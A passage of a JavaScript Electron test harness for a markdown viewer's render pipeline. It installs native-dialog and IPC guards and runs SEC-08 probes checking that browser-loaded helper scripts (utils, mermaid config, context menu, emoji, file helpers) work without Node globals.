// End-to-end security regression harness for the render pipeline.
// Run with: npm run test:security
//
// Boots the real main.js, then drives window.renderMarkdown() with the exact
// payloads from docs/SECURITY-AUDIT.md (SEC-01 through SEC-04) and asserts that none
// of them execute. Every attack test is paired with a feature test, because the
// remedy - making DOMPurify the last step in the pipeline instead of the third
// of nine - is exactly the kind of change that can silently stop mermaid,
// images or @@@html blocks from rendering at all.
//
// Payloads set window.__pwned rather than spawning a process. The property that
// matters is whether document content executes in the isolated renderer;
// no payload starts another process.
const { app, BrowserWindow, dialog, ipcMain } = require("electron");
const fs = require("fs");
const path = require("path");
const vm = require("vm");
const { pathToFileURL } = require("url");
const { isDeepStrictEqual } = require("util");

// Isolate this suite's userData profile before main.js exists and before the
// app is ready. See test-userdata-isolation.js.
require("./test-userdata-isolation");

const SEC08_LOADER_FOCUSED_HARNESS = process.env.SEC08_LOADER_FOCUSED_HARNESS === "1";
const SEC08_FILE_HELPERS_FOCUSED_HARNESS =
  process.env.SEC08_FILE_HELPERS_FOCUSED_HARNESS === "1";
const SEC08_FILE_HELPERS_PUBLICATION_HARNESS =
  process.env.SEC08_FILE_HELPERS_PUBLICATION_HARNESS === "1";
const SEC08_FILE_HELPERS_DOTFILE_HARNESS =
  process.env.SEC08_FILE_HELPERS_DOTFILE_HARNESS === "1";
const SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS =
  process.env.SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS === "1";
let observedMain = null;
let chooserAllowance = null;
let expectedSecurityQuestion = null;
const securityGestureRegistration = { handler: null, installed: null, count: 0, observer: null };
let dir = null;
let registeredTempDirs = null;
let abortingSecurityHarness = false;
const securityWindows = new Map();

function failSecurityUnattended(error) {
  chooserAllowance = null;
  expectedSecurityQuestion = null;
  if (dir) registeredTempDirs?.delete(dir);
  try {
    fs.writeSync(2, "FAIL  security harness aborted  -> " +
      String(error?.stack || error) + "\n" +
      (dir ? "RETAINED security fixtures outside shared sweeps: " + dir + "\n" : ""));
  } catch { /* Reporting cannot postpone the nonzero exit. */ }
  if (abortingSecurityHarness) {
    process.exit(2);
    return;
  }
  abortingSecurityHarness = true;
  try { app.exit(2); } finally { process.exit(2); }
}
process.on("uncaughtException", failSecurityUnattended);
process.on("unhandledRejection", failSecurityUnattended);

const nativeDialogGuards = {};
for (const method of ["showMessageBox", "showMessageBoxSync", "showOpenDialog",
  "showOpenDialogSync", "showSaveDialog", "showSaveDialogSync", "showErrorBox"]) {
  const guard = method === "showOpenDialog" ? (...args) => {
    const allowance = chooserAllowance;
    chooserAllowance = null;
    let fixtureMatches = false;
    if (allowance && typeof allowance.fixture === "string" &&
        path.isAbsolute(allowance.fixture) && typeof allowance.markdown === "string") {
      try {
        fixtureMatches = fs.readFileSync(allowance.fixture, "utf8") === allowance.markdown;
      } catch { /* Missing or changed bytes cannot receive a chooser grant. */ }
    }
    const expected = {
      properties: ["openFile", "multiSelections"],
      filters: [
        { name: "Markdown Files", extensions: ["md", "markdown", "mdown", "mkd", "mkdn"] },
        { name: "Mermaid Files", extensions: ["mmd", "mermaid"] },
        { name: "All Files", extensions: ["*"] },
      ],
    };
    if (!allowance || allowance.consumed || args.length !== 2 ||
        args[0] !== observedMain || args[0] !== allowance.win ||
        args[0].isDestroyed() || args[0].webContents !== allowance.contents ||
        allowance.contents.isDestroyed() ||
        allowance.contents.mainFrame !== allowance.frame ||
        allowance.frame.isDestroyed() ||
        allowance.contents.getURL() !== allowance.pageUrl ||
        !isDeepStrictEqual(args[1], expected) || !fixtureMatches) {
      return failSecurityUnattended(new Error("Unexpected native dialog: " + method));
    }
    allowance.consumed = true;
    return Promise.resolve({ canceled: false, filePaths: [allowance.fixture] });
  } : () => failSecurityUnattended(new Error("Unexpected native dialog: " + method));
  nativeDialogGuards[method] = guard;
  if (method === "showOpenDialog") {
    Object.defineProperty(dialog, method, { value: guard, writable: false, configurable: false });
  } else {
    dialog[method] = guard;
  }
}
const { OwnedDialogs } = require("../src/owned-dialogs");
const realSecurityOwnedShow = OwnedDialogs.prototype.show;
function securityQuestionMatches(allowance, broker, owner, options) {
  try {
    const action = allowance?.action;
    const entry = action?.entry;
    return !!allowance && !allowance.consumed && action?.pending === true &&
      allowance.isCurrent() === true && owner === observedMain && owner === allowance.win &&
      !owner.isDestroyed() && owner.webContents === allowance.contents &&
      !allowance.contents.isDestroyed() && allowance.contents.mainFrame === allowance.frame &&
      !allowance.frame.isDestroyed() && allowance.contents.getURL() === allowance.pageUrl &&
      allowance.frame.url === allowance.pageUrl &&
      entry?.kind === "link" && entry.href === allowance.href &&
      entry.documentRef === allowance.documentRef && entry.owner === true && entry.frame === true &&
      entry.windowId === owner.id && entry.frameId === allowance.frame.frameTreeNodeId &&
      action.entries === 1 && !action.question && !action.settled &&
      ((allowance.basename === "diagram.svg" && action.label === "svg" &&
          (allowance.choice === 0 || allowance.choice === 1)) ||
        (allowance.basename === "LICENSE" && action.label === "license" && allowance.choice === 1)) &&
      broker.owners.size === 0 && broker.requests.size === 0 &&
      isDeepStrictEqual(Object.keys(options).sort(), [
        "allowUnavailableRenderer", "buttons", "cancelId", "defaultId", "isCurrent",
        "message", "onFailure", "title", "type",
      ]) &&
      options.type === "question" && options.title === "Open external file" &&
      options.message === `Open "${allowance.basename}" with its system application?` &&
      isDeepStrictEqual(options.buttons, ["Cancel", "Open"]) &&
      options.defaultId === 0 && options.cancelId === 0 &&
      options.allowUnavailableRenderer === false &&
      typeof options.onFailure === "function" && typeof options.isCurrent === "function" &&
      options.isCurrent() === true;
  } catch { return false; }
}
const blockSecurityOwnedDialog = function(owner, options) {
  const allowance = expectedSecurityQuestion;
  expectedSecurityQuestion = null;
  if (!securityQuestionMatches(allowance, this, owner, options)) {
    return failSecurityUnattended(new Error("Unexpected Main-owned security dialog"));
  }
  // Consume before entering the real broker: neither a reentrant question nor
  // another request can borrow this gesture's explicitly expected choice.
  allowance.consumed = true;
  const answer = realSecurityOwnedShow.apply(this, arguments);
  const request = this.owners.get(owner)?.active;
  if (!request || request.options !== options || request.owner !== owner ||
      request.sender !== allowance.contents || request.frame !== allowance.frame ||
      request.ownerUrl !== allowance.pageUrl || request.state.queue.length !== 0 ||
      this.requests.get(request.id) !== request) {
    return failSecurityUnattended(new Error("Expected question did not retain its actual Main request"));
  }
  allowance.action.question = { broker: this, request, answer, settled: false, result: null };
  const question = allowance.action.question;
  Promise.resolve(answer).then(result => {
    question.result = result;
    question.settled = true;
  }, error => {
    question.error = String(error?.message || error);
    question.settled = true;
  });
  return answer;
};
OwnedDialogs.prototype.show = blockSecurityOwnedDialog;
const securityDialogGuardsIntact = () =>
  Object.entries(nativeDialogGuards).every(([method, guard]) => dialog[method] === guard) &&
  Object.getOwnPropertyDescriptor(dialog, "showOpenDialog").writable === false &&
  OwnedDialogs.prototype.show === blockSecurityOwnedDialog;

const visualUtils = require("./test-visual-utils");
registeredTempDirs = visualUtils.REGISTERED_TEMP_DIRS;
dir = visualUtils.tempDir("mdv-sec-");
// Neither shared exit sweep may remove watched fixtures from a live or
// unconfirmed owner. Only the terminal destruction check returns this entry.
registeredTempDirs.delete(dir);
// Keep the shared recording trap, including its positive external-link probes.
// Installing it before Main does not turn expected shell observations into vetoes.
const securityShellTrap = visualUtils.trapExternalOpens(null);
app.on("browser-window-created", (_event, win) => securityWindows.set(win, win.webContents));
if (
  !SEC08_LOADER_FOCUSED_HARNESS &&
  !SEC08_FILE_HELPERS_FOCUSED_HARNESS &&
  !SEC08_FILE_HELPERS_PUBLICATION_HARNESS &&
  !SEC08_FILE_HELPERS_DOTFILE_HARNESS &&
  !SEC08_FILE_HELPERS_MISSING_GLOBAL_HARNESS
) {
  if (BrowserWindow.getAllWindows().length !== 0) {
    failSecurityUnattended(new Error("A window existed before security Main observation"));
  }
  app.once("browser-window-created", (_event, win) => { observedMain = win; });
  // Capture only the one actual registration. The fixed dispatcher always
  // forwards the original receiver/arguments/result, including Promise identity;
  // local observation never obtains a private transport or invokes Main itself.
  const registerSecurityHandle = ipcMain.handle;
  const securityRegisterDescriptor = Object.getOwnPropertyDescriptor(ipcMain, "handle");
  const captureSecurityHandle = function(channel, handler) {
    if (channel !== "private-trusted-document-gesture") {
      return registerSecurityHandle.apply(this, arguments);
    }
    if (++securityGestureRegistration.count !== 1 || typeof handler !== "function") {
      throw new Error("Unexpected trusted-gesture Main registration");
    }
    securityGestureRegistration.handler = handler;
    const forwarded = function(event, data) {
      const observer = securityGestureRegistration.observer;
      const record = observer?.enter(event, data);
      let result;
      try { result = handler.apply(this, arguments); }
      catch (error) {
        observer?.finish(record, undefined, error);
        throw error;
      }
      if (observer) Promise.resolve(result).then(
        reply => observer.finish(record, reply, null),
        error => observer.finish(record, undefined, error),
      );
      return result;
    };
    securityGestureRegistration.installed = forwarded;
    return registerSecurityHandle.call(this, channel, forwarded);
  };
  ipcMain.handle = captureSecurityHandle;
  try { require("../src/main.js"); }
  finally {
    if (ipcMain.handle !== captureSecurityHandle) {
      throw new Error("Security Main registration capture lost ownership");
    }
    if (securityRegisterDescriptor) Object.defineProperty(ipcMain, "handle", securityRegisterDescriptor);
    else delete ipcMain.handle;
    if (ipcMain.handle !== registerSecurityHandle) {
      throw new Error("Security Main registration capture did not restore its original registrar");
    }
  }
}

const results = [];
const skipped = [];
function check(name, ok, detail) {
  results.push({ name, ok, detail });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${ok ? "" : "  -> " + detail}`);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const {
  startErrorSentinel,
  proveSentinelAlive,
  captureScreenshot,
  trapExternalOpens,
  waitForExternalTrap,
  admitTestDocument,
} = require("./test-visual-utils");

// Page-local errors cannot be reconstructed after navigation destroys the page.
const E2E_SENTINEL = `
  window.__e2eErrors = [];
  window.addEventListener('error', e => window.__e2eErrors.push(String(e.message)));
  window.addEventListener('unhandledrejection', e => window.__e2eErrors.push(String(e.reason)));
  null;
`;

async function runUtilsLoaderProbe() {
  const commonJsUtils = require("../src/utils.js");
  check(
    "SEC-08 utils preserves its CommonJS API",
    commonJsUtils.removeBOM("\uFEFFloader") === "loader" &&
      commonJsUtils.getFileName("C:\\docs\\loader.md") === "loader.md" &&
      commonJsUtils.getDirectory("C:\\docs\\loader.md") === "C:/docs" &&
      commonJsUtils.escapeRegex("a+b?") === "a\\+b\\?" &&
      commonJsUtils.formatBytes(1536) === "1.5 KB",
    JSON.stringify(Object.keys(commonJsUtils).sort()),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-utils-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "utils-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaUtils;
        const terminal = document.getElementById("sec08-utils-loader-terminal");
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          apiType: typeof api,
          behavior: api && {
            removeBOM: api.removeBOM("\\uFEFFloader"),
            fileName: api.getFileName("C:\\\\docs\\\\loader.md"),
            directory: api.getDirectory("C:\\\\docs\\\\loader.md"),
            regex: api.escapeRegex("a+b?"),
            bytes: api.formatBytes(1536),
          },
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic utils script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This static document marker proves parsing completed independently of
      // FoliaUtils, so R680 can distinguish a missing API from a failed load.
      "SEC-08 loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic utils script publishes representative FoliaUtils behavior",
      probe.apiType === "object" &&
        probe.behavior &&
        probe.behavior.removeBOM === "loader" &&
        probe.behavior.fileName === "loader.md" &&
        probe.behavior.directory === "C:/docs" &&
        probe.behavior.regex === "a\\+b\\?" &&
        probe.behavior.bytes === "1.5 KB",
      JSON.stringify(probe),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

async function runMermaidConfigLoaderProbe() {
  const commonJsMermaidConfig = require("../src/mermaid-config.js");
  const commonJsLight = commonJsMermaidConfig.getMermaidConfig(false);
  const commonJsDark = commonJsMermaidConfig.getMermaidConfig(true);
  const expectedKeys = [
    "MERMAID_DARK_THEME",
    "MERMAID_FLOWCHART",
    "MERMAID_FONT_PX",
    "MERMAID_LIGHT_THEME",
    "MERMAID_SEQUENCE",
    "applyMermaidDarkBoundaries",
    "getMermaidConfig",
  ];
  check(
    "SEC-08 mermaid-config preserves its CommonJS API",
    JSON.stringify(Object.keys(commonJsMermaidConfig).sort()) === JSON.stringify(expectedKeys) &&
      typeof commonJsMermaidConfig.applyMermaidDarkBoundaries === "function" &&
      commonJsMermaidConfig.MERMAID_FONT_PX === 14 &&
      commonJsLight.theme === "default" &&
      commonJsDark.theme === "dark" &&
      commonJsLight.themeVariables.primaryColor === "#279EA7" &&
      commonJsDark.themeVariables.primaryColor === "#3DBDC6" &&
      commonJsLight.flowchart.padding === 6 &&
      commonJsDark.flowchart.rankSpacing === 38 &&
      commonJsLight.sequence.width === 118 &&
      commonJsDark.sequence.messageFontSize === 14,
    JSON.stringify({ keys: Object.keys(commonJsMermaidConfig).sort(), commonJsLight, commonJsDark }),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-mermaid-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "mermaid-config-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaMermaidConfig;
        const terminal = document.getElementById("sec08-mermaid-loader-terminal");
        const light = api && api.getMermaidConfig(false);
        const dark = api && api.getMermaidConfig(true);
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          apiType: typeof api,
          darkBoundaryType: api && typeof api.applyMermaidDarkBoundaries,
          keys: api && Object.keys(api).sort(),
          fontPx: api && api.MERMAID_FONT_PX,
          light: light && {
            theme: light.theme,
            primaryColor: light.themeVariables.primaryColor,
            fontSize: light.themeVariables.fontSize,
            flowchartPadding: light.flowchart.padding,
            sequenceWidth: light.sequence.width,
          },
          dark: dark && {
            theme: dark.theme,
            primaryColor: dark.themeVariables.primaryColor,
            fontSize: dark.themeVariables.fontSize,
            flowchartRankSpacing: dark.flowchart.rankSpacing,
            sequenceMessageFontSize: dark.sequence.messageFontSize,
          },
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic mermaid-config script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This static document marker proves parsing completed independently of
      // FoliaMermaidConfig, so R683 can distinguish a missing API from a failed load.
      "SEC-08 mermaid loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic mermaid-config script publishes representative FoliaMermaidConfig behavior",
      probe.apiType === "object" &&
        probe.darkBoundaryType === "function" &&
        JSON.stringify(probe.keys) === JSON.stringify(expectedKeys) &&
        probe.fontPx === 14 &&
        probe.light &&
        probe.light.theme === "default" &&
        probe.light.primaryColor === "#279EA7" &&
        probe.light.fontSize === "14px" &&
        probe.light.flowchartPadding === 6 &&
        probe.light.sequenceWidth === 118 &&
        probe.dark &&
        probe.dark.theme === "dark" &&
        probe.dark.primaryColor === "#3DBDC6" &&
        probe.dark.fontSize === "14px" &&
        probe.dark.flowchartRankSpacing === 38 &&
        probe.dark.sequenceMessageFontSize === 14,
      JSON.stringify(probe),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 mermaid loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 mermaid loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

async function runContextMenuLoaderProbe() {
  const commonJsContextMenu = require("../src/context-menu-utils.js");
  check(
    "SEC-08 context-menu utilities preserve their CommonJS API",
    JSON.stringify(Object.keys(commonJsContextMenu).sort()) ===
      JSON.stringify(["hideContextMenu", "positionContextMenu"]) &&
      typeof commonJsContextMenu.positionContextMenu === "function" &&
      typeof commonJsContextMenu.hideContextMenu === "function",
    JSON.stringify(Object.keys(commonJsContextMenu).sort()),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    width: 320,
    height: 240,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-context-menu-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "context-menu-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaContextMenu;
        const terminal = document.getElementById("sec08-context-menu-loader-terminal");
        const menu = document.getElementById("sec08-context-menu-loader-menu");
        const viewport = { width: window.innerWidth, height: window.innerHeight };
        api && api.positionContextMenu(menu, viewport.width - 1, viewport.height - 1);
        const shownRect = menu && menu.getBoundingClientRect();
        const shown = menu && {
          visible: menu.classList.contains("visible"),
          left: Number.parseFloat(menu.style.left),
          top: Number.parseFloat(menu.style.top),
          right: shownRect.right,
          bottom: shownRect.bottom,
          width: shownRect.width,
          height: shownRect.height,
        };
        api && api.hideContextMenu(menu);
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          apiType: typeof api,
          apiKeys: api && Object.keys(api).sort(),
          shown,
          hidden: menu && !menu.classList.contains("visible"),
          viewport,
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic context-menu script runs without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This static document marker proves parsing completed independently of
      // FoliaContextMenu, so R687 can distinguish a missing API from a failed load.
      "SEC-08 context-menu loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic context-menu script clamps, shows, and hides its menu",
      probe.apiType === "object" &&
        JSON.stringify(probe.apiKeys) ===
          JSON.stringify(["hideContextMenu", "positionContextMenu"]) &&
        probe.shown &&
        probe.shown.visible === true &&
        probe.shown.left === probe.viewport.width - probe.shown.width - 10 &&
        probe.shown.top === probe.viewport.height - probe.shown.height - 10 &&
        probe.shown.right <= probe.viewport.width - 10 &&
        probe.shown.bottom <= probe.viewport.height - 10 &&
        probe.hidden === true,
      JSON.stringify(probe),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 context-menu loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 context-menu loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

async function runEmojiLoaderProbe() {
  const commonJsEmojiMap = require("../src/emoji-map.js");
  const commonJsEmoji = require("../src/emoji-parser.js");
  const commonJsKnown = commonJsEmoji.parseEmojis("Known :star:");
  const commonJsUnknown = commonJsEmoji.parseEmojis("Unknown :notanemoji_xyz:");
  check(
    "SEC-08 emoji map and parser preserve their CommonJS behavior",
    commonJsEmojiMap.star === "\u2b50" &&
      JSON.stringify(Object.keys(commonJsEmoji).sort()) === JSON.stringify(["parseEmojis"]) &&
      commonJsKnown === "Known \u2b50" &&
      commonJsUnknown === "Unknown :notanemoji_xyz:",
    JSON.stringify({
      star: commonJsEmojiMap.star,
      keys: Object.keys(commonJsEmoji).sort(),
      commonJsKnown,
      commonJsUnknown,
    }),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-emoji-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "emoji-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const map = window.FoliaEmojiMap;
        const api = window.FoliaEmoji;
        const terminal = document.getElementById("sec08-emoji-loader-terminal");
        return {
          terminal: terminal && terminal.dataset.status,
          requireType: typeof window.require,
          moduleType: typeof window.module,
          processType: typeof window.process,
          mapType: typeof map,
          parserType: typeof api,
          mapStar: map && map.star,
          parserKeys: api && Object.keys(api).sort(),
          known: api && api.parseEmojis("Known :star:"),
          unknown: api && api.parseEmojis("Unknown :notanemoji_xyz:"),
        };
      })()`,
      true,
    );
    check(
      "SEC-08 classic emoji scripts run without Node globals",
      probe.requireType === "undefined" &&
        probe.moduleType === "undefined" &&
        probe.processType === "undefined",
      JSON.stringify(probe),
    );
    check(
      // This marker belongs to the static fixture, so it remains an
      // independent setup control when either classic script fails to load.
      "SEC-08 emoji loader document reaches its terminal DOM marker",
      probe.terminal === "parsed",
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic emoji scripts publish FoliaEmojiMap and FoliaEmoji",
      probe.mapType === "object" &&
        probe.parserType === "object" &&
        probe.mapStar === "\u2b50" &&
        JSON.stringify(probe.parserKeys) === JSON.stringify(["parseEmojis"]),
      JSON.stringify(probe),
    );
    check(
      "SEC-08 classic emoji parser converts known shortcodes and preserves unknown shortcodes",
      probe.known === "Known \u2b50" && probe.unknown === "Unknown :notanemoji_xyz:",
      JSON.stringify(probe),
    );

    await sentinel.mute("missing FoliaEmojiMap must fail loudly");
    let missingMapSetup;
    let missingMapMute;
    try {
      missingMapSetup = await loaderWin.webContents.executeJavaScript(
        `new Promise((resolve) => {
          const savedMap = window.FoliaEmojiMap;
          delete window.FoliaEmojiMap;
          const script = document.createElement("script");
          script.src = "../../src/emoji-parser.js?sec08-missing-map=" + Date.now();
          const finish = (event) => {
            const mapWasAbsent = window.FoliaEmojiMap === undefined;
            window.FoliaEmojiMap = savedMap;
            script.remove();
            resolve({
              event,
              mapWasAbsent,
              mapRestored: window.FoliaEmojiMap === savedMap,
            });
          };
          script.addEventListener("load", () => finish("load"), { once: true });
          script.addEventListener("error", () => finish("error"), { once: true });
          document.head.appendChild(script);
        })`,
        true,
      );
      await sentinel.drain();
      missingMapMute = sentinel.currentMute();
    } finally {
      await sentinel.unmute();
    }
    const missingMapSuppressed = (missingMapMute && missingMapMute.suppressed) || [];
    check(
      "SEC-08 emoji missing-map probe removes and restores the browser map around a fresh parser load",
      missingMapSetup &&
        missingMapSetup.event === "load" &&
        missingMapSetup.mapWasAbsent === true &&
        missingMapSetup.mapRestored === true,
      JSON.stringify(missingMapSetup),
    );
    check(
      "SEC-08 emoji parser fails loudly when its browser map is absent",
      missingMapSuppressed.some(
        (entry) =>
          entry.kind === "console-error" &&
          entry.detail.includes("FoliaEmojiMap must load before emoji-parser.js"),
      ),
      JSON.stringify(missingMapSuppressed),
    );

    const alive = await proveSentinelAlive(loaderWin, sentinel);
    check(
      "SEC-08 emoji loader error sentinel was demonstrably watching both channels",
      alive.console === true && alive.dom === true,
      JSON.stringify(alive),
    );
  } finally {
    const sentinelReport = await sentinel.stop();
    check(
      "SEC-08 emoji loader fixture emits no unexpected errors",
      sentinelReport.hits.length === 0 && sentinelReport.stalls.length === 0,
      JSON.stringify(sentinelReport),
    );
    if (!loaderWin.isDestroyed()) loaderWin.destroy();
  }
}

const FILE_HELPER_EXTENSION_CASES = [
  "diagram.mmd",
  "diagram.MMD",
  "diagram.MeRmAiD",
  "diagram.mermaid",
  "document.md",
  "document.markdown",
  "document.mdown",
  "document.mkd",
  "document.mkdn",
  ".md",
  "..mmd",
  "C:.mmd",
  "diagram.mmd.",
  "diagram.mmd/",
  "diagram.mmd\\",
  "dir/diagram.mmd",
  "C:\\docs\\diagram.mmd",
  "C:\\docs\\.md",
  "dir.mmd\\plain",
  "...",
];

async function runFileHelpersLoaderProbe({
  includeCore = true,
  includeMissingGlobal = true,
  extensionCases = FILE_HELPER_EXTENSION_CASES,
} = {}) {
  if (includeCore) {
  const extensionCaseLabel =
    `${extensionCases.length} ${extensionCases.length === 1 ? "case" : "cases"}`;
  const commonJsCore = require("../src/file-helpers-core.js");
  const commonJsAdapter = require("../src/file-helpers.js");
  const utf8Cases = [
    "", "ASCII\r\n", "\u007f\u0080\u07ff\u0800",
    "caf\u00e9 \u6f22\u5b57", "\ud83d\ude80",
    "\ud800", "\udc00", "\ud800\ud800\udc00",
    "\udc00\ud800A\ud83d\ude80",
  ];
  const commonJsByteCounts = utf8Cases.map(commonJsCore.utf8ByteLength);
  const commonJsRejected = [null, undefined, 0, [], {}].map(value => {
    try { commonJsCore.utf8ByteLength(value); return false; }
    catch (error) { return error instanceof TypeError; }
  });
  const expectedAdapterKeys = [
    "FENCED_LINE_DISCOUNT",
    "LARGE_DOC_BUDGET_MS",
    "MS_PER_UNIT",
    "SUPPORTED_EXTENSIONS",
    "estimateRenderMs",
    "estimateRenderUnits",
    "isLargeDocument",
    "isMarkdownFile",
    "isMermaidFile",
    "readMarkdownFile",
    "removeBOM",
    "sendIPCResult",
    "utf8ByteLength",
    "wrapMermaidContent",
  ];
  const adapterProbePath = path.join(dir, "file-helpers-loader.mmd");
  fs.writeFileSync(adapterProbePath, "\uFEFFgraph TD\n  A --> B\n", "utf8");
  let adapterRead;
  let adapterError;
  try {
    adapterRead = await new Promise((resolve) => {
      commonJsAdapter.readMarkdownFile(adapterProbePath, (error, content) =>
        resolve({ error, content }),
      );
    });
    adapterError = await new Promise((resolve) => {
      commonJsAdapter.readMarkdownFile(
        path.join(dir, "file-helpers-loader-missing.md"),
        (error, content) => resolve({ error, content }),
      );
    });
  } finally {
    fs.unlinkSync(adapterProbePath);
  }
  const sent = [];
  const webContents = {
    send(channel, payload) {
      sent.push({ channel, payload });
    },
  };
  commonJsAdapter.sendIPCResult(webContents, "file-helpers-success", true, { value: 1 });
  commonJsAdapter.sendIPCResult(webContents, "file-helpers-failure", false, { reason: "missing" });
  check(
    "SEC-08 file-helpers adapter preserves its CommonJS API, reader errors, and IPC payloads",
    JSON.stringify(Object.keys(commonJsAdapter).sort()) === JSON.stringify(expectedAdapterKeys) &&
      Object.keys(commonJsCore).every((key) => commonJsAdapter[key] === commonJsCore[key]) &&
      adapterRead.error === null &&
      adapterRead.content === "```mermaid\ngraph TD\n  A --> B\n\n```" &&
      adapterError.error &&
      adapterError.error.code === "ENOENT" &&
      adapterError.content === null &&
      JSON.stringify(sent) ===
        JSON.stringify([
          {
            channel: "file-helpers-success",
            payload: { success: true, value: 1 },
          },
          {
            channel: "file-helpers-failure",
            payload: { success: false, reason: "missing" },
          },
        ]),
    JSON.stringify({
      adapterKeys: Object.keys(commonJsAdapter).sort(),
      adapterRead: {
        code: adapterRead.error && adapterRead.error.code,
        content: adapterRead.content,
      },
      adapterError: {
        code: adapterError.error && adapterError.error.code,
        content: adapterError.content,
      },
      sent,
    }),
  );

  const coreSource = fs.readFileSync(path.join(__dirname, "..", "src", "file-helpers-core.js"), "utf8");
  const platformResults = ["win32", "linux"].map((platform) => {
    const module = { exports: {} };
    vm.runInNewContext(coreSource, {
      module,
      process: { platform },
    }, { filename: `file-helpers-core-${platform}.js` });
    const pathApi = platform === "win32" ? path.win32 : path.posix;
    return extensionCases.every((filePath) => {
      const extension = pathApi.extname(filePath).toLowerCase();
      return (
        module.exports.isMermaidFile(filePath) ===
          [".mmd", ".mermaid"].includes(extension) &&
        module.exports.isMarkdownFile(filePath) ===
          [".md", ".markdown", ".mdown", ".mkd", ".mkdn", ".mmd", ".mermaid"].includes(extension)
      );
    }) && (() => {
      try {
        module.exports.isMermaidFile(42);
        return false;
      } catch (error) {
        return error && error.name === "TypeError";
      }
    })();
  });
  check(
  `SEC-08 file-helpers core matches Node extname behavior on Windows and POSIX (${extensionCaseLabel})`,
    platformResults.every(Boolean),
    JSON.stringify({ extensionCases, platformResults }),
  );

  const loaderWin = new BrowserWindow({
    show: false,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
    },
  });
  const sentinel = startErrorSentinel(loaderWin, { label: "sec08-file-helpers-loader" });

  try {
    await loaderWin.loadFile(path.join(__dirname, "fixtures", "file-helpers-loader.html"));
    const probe = await loaderWin.webContents.executeJavaScript(
      `(() => {
        const api = window.FoliaFileHelpers;
        const terminal = document.getElementById("sec08-file-helpers-loader-terminal");
        const fence = String.fromCharCode(96).repeat(3);
        const sample = "# H\\n| a | b |\\n" + fence + "\\n| c | d |\\n" + fence + "\\n";
        const estimated = api && api.estimateRenderUnits(sample);
        const large = api && api.isLargeDocument(sample, 0);
        const cases = ${JSON.stringify(extensionCases)}.map((filePath) => ({
          filePath,
          mermaid: api && api.isMermaidFile(filePath),
          markdown: api && api.isMarkdownFile(filePath),
        }));
        return {
          terminal: terminal && terminal.dataset.status,
